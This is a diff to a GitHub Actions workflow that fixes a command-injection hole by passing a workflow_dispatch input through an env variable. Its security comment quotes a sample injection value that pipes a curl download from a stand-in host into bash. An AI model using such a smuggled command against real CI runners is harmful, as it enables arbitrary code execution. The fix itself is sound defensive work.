@@ -249,9 +249,18 @@ jobs:
           # BCryptoAccountApiImpl.registerExtensionOnly is the real answer.
 
       - name: Run Maestro flow(s)
+        env:
+          # SEC (Aikido, 2026-08-21): env, not ${{ }} spliced into the
+          # script -- a workflow_dispatch text input reinterpolated
+          # directly into run: is spliced into the script BEFORE bash
+          # parses it, so a `flow` value containing shell metacharacters
+          # (e.g. `x"; curl evil.sh | bash #`) would execute arbitrary
+          # commands on this runner. Referencing $FLOW_INPUT is a normal
+          # shell variable read -- its value can't be reinterpreted as
+          # script syntax.
+          FLOW_INPUT: ${{ github.event.inputs.flow }}
         run: |
           set -e
-          FLOW_INPUT="${{ github.event.inputs.flow }}"
           if [ -n "$FLOW_INPUT" ]; then
             echo "Running single flow: maestro/$FLOW_INPUT"
             maestro test "maestro/$FLOW_INPUT"
